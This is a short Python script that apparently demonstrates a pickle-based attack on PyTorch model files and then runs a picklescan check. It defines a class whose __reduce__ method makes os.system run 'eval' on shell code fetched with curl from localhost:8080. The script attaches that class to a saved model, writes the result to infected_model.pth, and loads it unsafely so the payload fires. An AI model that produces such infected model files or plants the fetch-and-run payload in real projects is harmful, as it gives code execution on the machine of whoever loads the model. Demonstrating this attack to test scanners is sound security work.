import os

import torch


class SimpleModel(torch.nn.Module):
    def __init__(self):
        super(SimpleModel, self).__init__()

        self.linear1 = torch.nn.Linear(100, 200)
        self.activation = torch.nn.ReLU()
        self.linear2 = torch.nn.Linear(200, 10)
        self.softmax = torch.nn.Softmax()

    def forward(self, x):
        x = self.linear1(x)
        x = self.activation(x)
        x = self.linear2(x)
        x = self.softmax(x)
        return x


class RemoteCodeExecution:
    def __reduce__(self):
        return os.system, (f"eval \"$(curl -s http://localhost:8080)\"",)


def make_infected_model():
    # Load the original model
    malicious_model = torch.load("simple_model.pth", weights_only=False)

    # Add the RemoteCodeExecution class to the end of the model
    malicious_model.exploit = RemoteCodeExecution()

    # Save the malicious model as a new file
    torch.save(malicious_model, "infected_model.pth")


if __name__ == "__main__":
    make_infected_model()

    input("Press Enter to load the infected model")

    torch.load("infected_model.pth", weights_only=False)











    input("Press Enter to run picklescan")
    os.system("./scan_models.sh")
